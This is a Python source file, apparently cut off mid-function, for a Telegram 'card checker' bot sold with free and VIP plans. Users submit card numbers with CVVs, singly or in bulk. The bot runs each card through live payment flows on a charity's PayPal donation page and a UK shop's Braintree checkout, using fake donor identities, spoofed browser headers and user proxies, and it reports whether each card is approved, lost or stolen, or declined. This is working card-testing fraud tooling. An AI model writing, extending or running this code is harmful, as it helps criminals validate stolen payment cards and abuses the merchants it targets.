import os
import json
import shutil

if not os.path.exists("data.json"):
    with open("data.json", "w", encoding="utf-8") as f:
        json.dump({}, f)

# -*- coding: utf-8 -*-
import telebot
import tele
import re
from user_agent import generate_user_agent
import requests
import time
import random
import string
from telebot import types
from gatet import *
from datetime import datetime, timedelta
from faker import Faker
import threading
from bs4 import BeautifulSoup
import base64
import cloudscraper
import urllib3
from requests_toolbelt.multipart.encoder import MultipartEncoder
import jwt
from fake_useragent import UserAgent
import logging
from database import Database

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

stopuser = {}

db = Database()

RATE_LIMIT = {}
RATE_LIMIT_SECONDS = 5
RATE_LIMIT_VIP_SECONDS = 2
_RATE_LIMIT_LOCK = threading.Lock()

def check_rate_limit(user_id, plan='𝗙𝗥𝗘𝗘'):
    now = time.time()
    limit = RATE_LIMIT_VIP_SECONDS if plan != '𝗙𝗥𝗘𝗘' else RATE_LIMIT_SECONDS
    with _RATE_LIMIT_LOCK:
        stale = [uid for uid, ts in RATE_LIMIT.items() if now - ts > 60]
        for uid in stale:
            del RATE_LIMIT[uid]
        last = RATE_LIMIT.get(user_id, 0)
        if now - last < limit:
            return False, round(limit - (now - last), 1)
        RATE_LIMIT[user_id] = now
    return True, 0

_DATA_LOCK = threading.Lock()

def _load_data():
    with _DATA_LOCK:
        try:
            with open("data.json", 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            return {}

def _save_data(data):
    with _DATA_LOCK:
        try:
            with open("data.json", 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=4)
            return True
        except Exception as e:
            logger.error(f"data.json save error: {e}")
            return False

def _get_card_from_message(message):
    CARD_RE = re.compile(r'\d{13,19}[\|/ ]\d{1,2}[\|/ ]\d{2,4}[\|/ ]\d{3,4}')
    parts = message.text.split(' ', 1)
    if len(parts) > 1 and parts[1].strip():
        return parts[1].strip()
    if message.reply_to_message and message.reply_to_message.text:
        for line in message.reply_to_message.text.strip().split('\n'):
            line = line.strip()
            if CARD_RE.search(line):
                return line
    return None

def _get_cards_from_message(message):
    CARD_RE = re.compile(r'\d{13,19}[\|/ ]\d{1,2}[\|/ ]\d{2,4}[\|/ ]\d{3,4}')
    parts = message.text.split(' ', 1)
    if len(parts) > 1 and parts[1].strip():
        text = parts[1].strip()
    elif message.reply_to_message and message.reply_to_message.text:
        text = message.reply_to_message.text.strip()
    elif message.reply_to_message and message.reply_to_message.document:
        try:
            doc = message.reply_to_message.document
            file_info = bot.get_file(doc.file_id)
            downloaded = bot.download_file(file_info.file_path)
            text = downloaded.decode('utf-8', errors='ignore')
        except:
            return None
    else:
        return None
    cards = []
    seen = set()
    for l in text.split('\n'):
        m = CARD_RE.search(l.strip())
        if m:
            cc = m.group().replace('/', '|').replace(' ', '|')
            if cc not in seen:
                seen.add(cc)
                cards.append(cc)
    return cards if cards else None

def get_user_plan(user_id):
    try:
        with _DATA_LOCK:
            try:
                with open("data.json", 'r', encoding='utf-8') as f:
                    data = json.load(f)
            except Exception:
                return '𝗙𝗥𝗘𝗘', False
            plan = data.get(str(user_id), {}).get('plan', '𝗙𝗥𝗘𝗘')
            timer = data.get(str(user_id), {}).get('timer', 'none')
            if plan in ['𝗩𝗜𝗣', 'VIP'] and timer not in ['none', None, '']:
                try:
                    exp = datetime.strptime(timer.split('.')[0], "%Y-%m-%d %H:%M")
                    if datetime.now() > exp:
                        data[str(user_id)]['plan'] = '𝗙𝗥𝗘𝗘'
                        data[str(user_id)]['timer'] = 'none'
                        with open("data.json", 'w', encoding='utf-8') as f:
                            json.dump(data, f, ensure_ascii=False, indent=4)
                        return '𝗙𝗥𝗘𝗘', True
                except Exception:
                    pass
            return plan, False
    except Exception:
        return '𝗙𝗥𝗘𝗘', False

def log_command(message, query_type='command', gateway=None):
    try:
        user = message.from_user
        db.save_user(
            user_id=user.id,
            username=user.username,
            first_name=user.first_name,
            last_name=user.last_name
        )
        query_id = db.save_query(
            user_id=user.id,
            message_id=message.message_id,
            query_text=message.text or '',
            query_type=query_type,
            chat_id=message.chat.id,
            gateway=gateway
        )
        return query_id
    except Exception as e:
        logger.error(f"Error logging command: {e}")
        return None

def log_card_check(user_id, card, gateway, result, response_detail=None, exec_time=None):
    try:
        bin_part = card.split('|')[0][:6] + 'xxxxxx'
        db.save_card_check(
            user_id=user_id,
            card_bin=bin_part,
            gateway=gateway,
            result=result,
            response_detail=response_detail,
            execution_time=exec_time
        )
    except Exception as e:
        logger.error(f"Error logging card check: {e}")

# ── Global thread exception wrapper ──────────────────────────────────────────
def _safe_thread(fn):
    """Wrap a thread target so unhandled exceptions are logged, not silently lost."""
    import functools
    @functools.wraps(fn)
    def wrapper(*args, **kwargs):
        try:
            return fn(*args, **kwargs)
        except Exception as _te:
            logger.error(f"[THREAD ERROR] {fn.__name__}: {_te}", exc_info=True)
    return wrapper

# ── Proxy validation helper ───────────────────────────────────────────────────
def _validate_proxy(proxy_dict, timeout=8):
    """Return True if proxy is reachable, False otherwise."""
    if not proxy_dict:
        return True
    try:
        r = requests.get("https://api.ipify.org?format=json",
                         proxies=proxy_dict, timeout=timeout)
        return r.status_code == 200
    except Exception:
        return False

# ─────────────────────────────────────────────────────────────────────────────
token = os.environ.get('BOT_TOKEN', '').strip()
if not token:
    raise SystemExit("❌ BOT_TOKEN is not set. Please add it to Replit Secrets.")

_admin_raw = os.environ.get('ADMIN_ID', '').strip()
if not _admin_raw or not _admin_raw.lstrip('-').isdigit():
    raise SystemExit("❌ ADMIN_ID is not set or invalid. Please add your Telegram numeric ID to Replit Secrets.")

bot = telebot.TeleBot(token, parse_mode="HTML")
admin = int(_admin_raw)
BOT_START_TIME = time.time()

command_usage = {}

# ملف تخزين البروكسي لكل مستخدم
PROXY_FILE   = 'user_proxies.json'
_PROXY_LOCK  = threading.Lock()

def load_user_proxies():
    with _PROXY_LOCK:
        try:
            with open(PROXY_FILE, 'r') as f:
                return json.load(f)
        except Exception:
            return {}

def save_user_proxies(proxies):
    with _PROXY_LOCK:
        with open(PROXY_FILE, 'w') as f:
            json.dump(proxies, f, indent=4)

def get_user_proxy(user_id):
    proxies = load_user_proxies()
    return proxies.get(str(user_id), None)

def set_user_proxy(user_id, proxy):
    proxies = load_user_proxies()
    proxies[str(user_id)] = proxy
    save_user_proxies(proxies)

def remove_user_proxy(user_id):
    proxies = load_user_proxies()
    if str(user_id) in proxies:
        del proxies[str(user_id)]
        save_user_proxies(proxies)

def parse_proxy(raw):
    if any(raw.startswith(p) for p in ['http://', 'https://', 'socks4://', 'socks5://']):
        return raw

    is_socks = 'socks' in raw.lower()
    proto = 'socks5' if is_socks else 'http'

    parts = raw.split(':')

    if len(parts) == 4:
        p1, p2, p3, p4 = parts
        if p2.isdigit():
            return f'{proto}://{p3}:{p4}@{p1}:{p2}'
        elif p4.isdigit():
            return f'{proto}://{p1}:{p2}@{p3}:{p4}'
        else:
            return f'{proto}://{p3}:{p4}@{p1}:{p2}'
    elif len(parts) == 2:
        return f'{proto}://{parts[0]}:{parts[1]}'
    elif len(parts) == 5:
        first = parts[0].lower()
        if first in ['http', 'https', 'socks4', 'socks5']:
            return f'{first}://{parts[3]}:{parts[4]}@{parts[1]}:{parts[2]}'
        else:
            return f'{proto}://{raw}'
    else:
        return f'{proto}://{raw}'

def get_proxy_dict(user_id):
    proxy = get_user_proxy(user_id)
    if proxy:
        return {'http': proxy, 'https': proxy}
    return None

def apply_proxy(session_obj, user_id):
    proxy_dict = get_proxy_dict(user_id)
    if proxy_dict:
        session_obj.proxies.update(proxy_dict)
    return session_obj

# ملف تخزين إعدادات المبالغ لكل مستخدم
AMOUNT_FILE = 'user_amounts.json'
# ملف تخزين الأكواد المستخدمة
USED_CODES_FILE = 'used_codes.json'

def load_user_amounts():
    try:
        with open(AMOUNT_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_user_amounts(amounts):
    with open(AMOUNT_FILE, 'w') as f:
        json.dump(amounts, f, indent=4)

def get_user_amount(user_id):
    amounts = load_user_amounts()
    return amounts.get(str(user_id), "1.00")

def set_user_amount(user_id, amount):
    amounts = load_user_amounts()
    amounts[str(user_id)] = amount
    save_user_amounts(amounts)

# دوال إدارة الأكواد المستخدمة
def load_used_codes():
    try:
        with open(USED_CODES_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"used_codes": []}

def save_used_codes(used_codes):
    with open(USED_CODES_FILE, 'w') as f:
        json.dump(used_codes, f, indent=4)

def is_code_used(code):
    used = load_used_codes()
    return code in used.get("used_codes", [])

def mark_code_as_used(code):
    used = load_used_codes()
    if "used_codes" not in used:
        used["used_codes"] = []
    used["used_codes"].append(code)
    save_used_codes(used)

def reset_command_usage():
    for user_id in command_usage:
        command_usage[user_id] = {'count': 0, 'last_time': None}

# ================== PayPal Gateway Function ==================
def paypal_gate(ccx, amount="1.00", proxy_dict=None):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3].strip()
    if "20" in yy:
        yy = yy.split("20")[1]
    
    try:
        amount_float = float(amount)
        if amount_float < 0.01:
            amount = "0.01"
        elif amount_float > 5.00:
            amount = "5.00"
        else:
            amount = f"{amount_float:.2f}"
    except:
        amount = "1.00"
    
    first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
    states = ["AL", "AK", "AZ", "AR", "CA", "CO", "CT", "DE", "FL", "GA", "HI", "ID", "IL", "IN", "IA", "KS", "KY", "LA", "ME", "MD", "MA", "MI", "MN", "MS", "MO", "MT", "NE", "NV", "NH", "NJ", "NM", "NY", "NC", "ND", "OH", "OK", "OR", "PA", "RI", "SC", "SD", "TN", "TX", "UT", "VT", "VA", "WA", "WV", "WI", "WY"]
    street_names = ["Main", "Oak", "Pine", "Maple", "Cedar", "Elm", "Washington", "Lake", "Hill", "Park"]
    
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    email = f"{first_name.lower()}{last_name.lower()}{random.randint(100, 999)}@gmail.com"
    phone = f"{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
    company = f"{random.choice(['Global', 'National', 'Advanced', 'Premium'])} {random.choice(['Tech', 'Solutions', 'Services', 'Group'])}"
    street_number = random.randint(100, 9999)
    street_name = random.choice(street_names)
    street_type = random.choice(["St", "Ave", "Blvd", "Rd", "Ln"])
    street_address1 = f"{street_number} {street_name} {street_type}"
    street_address2 = f"{random.choice(['Apt', 'Unit', 'Suite'])} {random.randint(1, 999)}"
    city = random.choice(cities)
    state_abbr = random.choice(states)
    zip_code = f"{random.randint(10000, 99999)}"
    country = "United States"
    
    r = requests.Session()
    r.verify = False
    if proxy_dict:
        r.proxies.update(proxy_dict)
    scraper = cloudscraper.create_scraper()
    if proxy_dict:
        scraper.proxies.update(proxy_dict)
    headers = {
        'user-agent': generate_user_agent(),
    }
    response = r.get(f'https://straphaelcenter.org/donate/', cookies=r.cookies, headers=headers)
    
    try:
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
        nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
        enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
    except AttributeError:
        return "Failed to extract form data"
    
    headers = {
        'origin': f'https://straphaelcenter.org',
        'referer': f'https://straphaelcenter.org/donate/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'give-honeypot': '',
        'give-form-id-prefix': id_form1,
        'give-form-id': id_form2,
        'give-form-title': '',
        'give-current-url': f'https://straphaelcenter.org/donate/',
        'give-form-url': f'https://straphaelcenter.org/donate/',
        'give-form-minimum': amount,
        'give-form-maximum': '999999.99',
        'give-form-hash': nonec,
        'give-price-id': 'custom',
        'give-amount': amount,
        'give_stripe_payment_method': '',
        'payment-mode': 'paypal-commerce',
        'give_first': first_name,
        'give_last': last_name,
        'give_email': email,
        'card_name': f"{first_name} {last_name}",
        'card_exp_month': '',
        'card_exp_year': '',
        'give_action': 'purchase',
        'give-gateway': 'paypal-commerce',
        'action': 'give_process_donation',
        'give_ajax': 'true',
    }
    
    response = r.post(f'https://straphaelcenter.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
    
    data = MultipartEncoder({
        'give-honeypot': (None, ''),
        'give-form-id-prefix': (None, id_form1),
        'give-form-id': (None, id_form2),
        'give-form-title': (None, ''),
        'give-current-url': (None, f'https://straphaelcenter.org/donate/'),
        'give-form-url': (None, f'https://straphaelcenter.org/donate/'),
        'give-form-minimum': (None, amount),
        'give-form-maximum': (None, '999999.99'),
        'give-form-hash': (None, nonec),
        'give-price-id': (None, 'custom'),
        'give-recurring-logged-in-only': (None, ''),
        'give-logged-in-only': (None, '1'),
        '_give_is_donation_recurring': (None, '0'),
        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
        'give-amount': (None, amount),
        'give_stripe_payment_method': (None, ''),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, first_name),
        'give_last': (None, last_name),
        'give_email': (None, email),
        'card_name': (None, f"{first_name} {last_name}"),
        'card_exp_month': (None, ''),
        'card_exp_year': (None, ''),
        'give-gateway': (None, 'paypal-commerce'),
    })
    
    headers = {
        'content-type': data.content_type,
        'origin': f'https://straphaelcenter.org',
        'referer': f'https://straphaelcenter.org/donate/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    params = {
        'action': 'give_paypal_commerce_create_order',
    }
    
    response = r.post(
        f'https://straphaelcenter.org/wp-admin/admin-ajax.php',
        params=params,
        cookies=r.cookies,
        headers=headers,
        data=data
    )
    
    try:
        tok = (response.json()['data']['id'])
    except:
        return "Failed to create order"
    
    headers = {
        'authority': 'cors.api.paypal.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
        'authorization': f'Bearer {au}',
        'braintree-sdk-version': '3.32.0-payments-sdk-dev',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': generate_user_agent(),
    }
    
    json_data = {
        'payment_source': {
            'card': {
                'number': n,
                'expiry': f'20{yy}-{mm}',
                'security_code': cvc,
                'attributes': {
                    'verification': {
                        'method': 'SCA_WHEN_REQUIRED',
                    },
                },
            },
        },
        'application_context': {
            'vault': False,
        },
    }
    
    response = r.post(
        f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
        headers=headers,
        json=json_data,
    )
    
    data = MultipartEncoder({
        'give-honeypot': (None, ''),
        'give-form-id-prefix': (None, id_form1),
        'give-form-id': (None, id_form2),
        'give-form-title': (None, ''),
        'give-current-url': (None, f'https://straphaelcenter.org/donate/'),
        'give-form-url': (None, f'https://straphaelcenter.org/donate/'),
        'give-form-minimum': (None, amount),
        'give-form-maximum': (None, '999999.99'),
        'give-form-hash': (None, nonec),
        'give-price-id': (None, 'custom'),
        'give-recurring-logged-in-only': (None, ''),
        'give-logged-in-only': (None, '1'),
        '_give_is_donation_recurring': (None, '0'),
        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
        'give-amount': (None, amount),
        'give_stripe_payment_method': (None, ''),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, first_name),
        'give_last': (None, last_name),
        'give_email': (None, email),
        'card_name': (None, f"{first_name} {last_name}"),
        'card_exp_month': (None, ''),
        'card_exp_year': (None, ''),
        'give-gateway': (None, 'paypal-commerce'),
    })
    headers = {
        'content-type': data.content_type,
        'origin': f'https://straphaelcenter.org',
        'referer': f'https://straphaelcenter.org/donate/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    params = {
        'action': 'give_paypal_commerce_approve_order',
        'order': tok,
    }
    
    response = r.post(
        f'https://straphaelcenter.org/wp-admin/admin-ajax.php',
        params=params,
        cookies=r.cookies,
        headers=headers,
        data=data
    )
    text = response.text
    if 'true' in text or 'sucsess' in text:
        return "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱"
    elif 'DO_NOT_HONOR' in text:
        return "𝗗𝗼 𝗻𝗼𝘁 𝗵𝗼𝗻𝗼𝗿"
    elif 'ACCOUNT_CLOSED' in text:
        return "𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗰𝗹𝗼𝘀𝗲𝗱"
    elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
        return "𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗰𝗹𝗼𝘀𝗲𝗱"
    elif 'LOST_OR_STOLEN' in text:
        return "𝗟𝗢𝗦𝗧 𝗢𝗥 𝗦𝗧𝗢𝗟𝗘𝗡"
    elif 'CVV2_FAILURE' in text:
        return "𝗖𝗮𝗿𝗱 𝗜𝘀𝘀𝘂𝗲𝗿 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 𝗖𝗩𝗩"
    elif 'SUSPECTED_FRAUD' in text:
        return "𝗦𝗨𝗦𝗣𝗘𝗖𝗧𝗘𝗗 𝗙𝗥𝗔𝗨𝗗"
    elif 'INVALID_ACCOUNT' in text:
        return '𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗔𝗖𝗖𝗢𝗨𝗡𝗧'
    elif 'REATTEMPT_NOT_PERMITTED' in text:
        return "𝗥𝗘𝗔𝗧𝗧𝗘𝗠𝗣𝗧 𝗡𝗢𝗧 𝗣𝗘𝗥𝗠𝗜𝗧𝗧𝗘𝗗"
    elif 'ACCOUNT BLOCKED BY ISSUER' in text:
        return "𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗕𝗟𝗢𝗖𝗞𝗘𝗗 𝗕𝗬 𝗜𝗦𝗦𝗨𝗘𝗥"
    elif 'ORDER_NOT_APPROVED' in text:
        return '𝗢𝗥𝗗𝗘𝗥 𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗'
    elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
        return '𝗣𝗜𝗖𝗞𝗨𝗣 𝗖𝗔𝗥𝗗 𝗦𝗣𝗘𝗖𝗜𝗔𝗟 𝗖𝗢𝗡𝗗𝗜𝗧𝗜𝗢𝗡𝗦'
    elif 'PAYER_CANNOT_PAY' in text:
        return "𝗣𝗔𝗬𝗘𝗥 𝗖𝗔𝗡𝗡𝗢𝗧 𝗣𝗔𝗬"
    elif 'INSUFFICIENT_FUNDS' in text:
        return '𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗙𝘂𝗻𝗱𝘀'
    elif 'GENERIC_DECLINE' in text:
        return '𝗚𝗘𝗡𝗘𝗥𝗜𝗖 𝗗𝗘𝗖𝗟𝗜𝗡𝗘'
    elif 'COMPLIANCE_VIOLATION' in text:
        return "𝗖𝗢𝗠𝗣𝗟𝗜𝗔𝗡𝗖𝗘 𝗩𝗜𝗢𝗟𝗔𝗧𝗜𝗢𝗡"
    elif 'TRANSACTION_NOT PERMITTED' in text:
        return "𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗡𝗢𝗧 𝗣𝗘𝗥𝗠𝗜𝗧𝗧𝗘𝗗"
    elif 'PAYMENT_DENIED' in text:
        return '𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗗𝗘𝗡𝗜𝗘𝗗'
    elif 'INVALID_TRANSACTION' in text:
        return "𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡"
    elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
        return "𝗥𝗘𝗦𝗧𝗥𝗜𝗖𝗧𝗘𝗗 𝗢𝗥 𝗜𝗡𝗔𝗖𝗧𝗜𝗩𝗘 𝗔𝗖𝗖𝗢𝗨𝗡𝗧"
    elif 'SECURITY_VIOLATION' in text:
        return '𝗦𝗘𝗖𝗨𝗥𝗜𝗧𝗬 𝗩𝗜𝗢𝗟𝗔𝗧𝗜𝗢𝗡'
    elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
        return "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 𝗗𝗨𝗘 𝗧𝗢 𝗨𝗣𝗗𝗔𝗧𝗘𝗗 𝗔𝗖𝗖𝗢𝗨𝗡𝗧"
    elif 'INVALID_OR_RESTRICTED_CARD' in text:
        return "𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗖𝗔𝗥𝗗"
    elif 'EXPIRED_CARD' in text:
        return "𝗘𝗫𝗣𝗜𝗥𝗘𝗗 𝗖𝗔𝗥𝗗"
    elif 'CRYPTOGRAPHIC_FAILURE' in text:
        return "𝗖𝗥𝗬𝗣𝗧𝗢𝗚𝗥𝗔𝗣𝗛𝗜𝗖 𝗙𝗔𝗜𝗟𝗨𝗥𝗘"
    elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
        return "𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗖𝗔𝗡𝗡𝗢𝗧 𝗕𝗘 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗"
    elif 'DECLINED_PLEASE_RETRY' in text:
        return "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 𝗣𝗟𝗘𝗔𝗦𝗘 𝗥𝗘𝗧𝗥𝗬 𝗟𝗔𝗧𝗘𝗥"
    elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
        return "𝗘𝗫𝗖𝗘𝗘𝗗 𝗟𝗜𝗠𝗜𝗧"
    elif 'NOT FOUND' in text or 'not found' in text.lower():
        return "𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗙𝘂𝗻𝗱𝘀"
    else:
        try:
            result = response.json()['data']['error']
            return f"𝗘𝗿𝗿𝗼𝗿: {result}"
        except:
            return "𝗨𝗡𝗞𝗡𝗢𝗪𝗡 𝗘𝗥𝗥𝗢𝗥"

# ================== Passed Gateway Function (Braintree 3DS) ==================
def passed_gate(ccx, proxy_dict=None):
    import string, bs4, random, requests, uuid, base64, jwt, re
    from user_agent import generate_user_agent
    
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3].strip()
    if "20" in yy:
        yy = yy.split("20")[1]
    
    user = generate_user_agent()
    r = requests.Session()
    if proxy_dict:
        r.proxies.update(proxy_dict)
    
    try:
        clear_url = "https://southenddogtraining.co.uk/wp-json/cocart/v2/cart/clear"
        clear_resp = r.post(clear_url)
        
        headers = {
            'authority': 'southenddogtraining.co.uk',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://southenddogtraining.co.uk',
            'pragma': 'no-cache',
            'referer': 'https://southenddogtraining.co.uk/shop/cold-pressed-dog-food/cold-pressed-sample/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        json_data = {
            'id': '123368',
            'quantity': '1',
        }
        
        response = r.post(
            'https://southenddogtraining.co.uk/wp-json/cocart/v2/cart/add-item',
            headers=headers,
            json=json_data,
        )
        cart_hash = response.json()['cart_hash']
        
        cookies = {
            'clear_user_data': 'true',
            'woocommerce_items_in_cart': '1',
            'woocommerce_cart_hash': cart_hash,
            'pmpro_visit': '1',
        }
        
        headers = {
            'authority': 'southenddogtraining.co.uk',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': 'https://southenddogtraining.co.uk/shop/cold-pressed-dog-food/cold-pressed-sample/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        response = r.get('https://southenddogtraining.co.uk/checkout/', cookies=cookies, headers=headers)
        client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
        add_nonce = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
        
        headers = {
            'authority': 'southenddogtraining.co.uk',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://southenddogtraining.co.uk',
            'pragma': 'no-cache',
            'referer': 'https://southenddogtraining.co.uk/checkout/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client,
        }
        
        response = r.post(
            'https://southenddogtraining.co.uk/cms/wp-admin/admin-ajax.php',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        enc = response.json()['data']
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
        
        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://southenddogtraining.co.uk',
            'pragma': 'no-cache',
            'referer': 'https://southenddogtraining.co.uk/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '6f25ee04-0384-46dc-9413-222fa62fc552',
            },
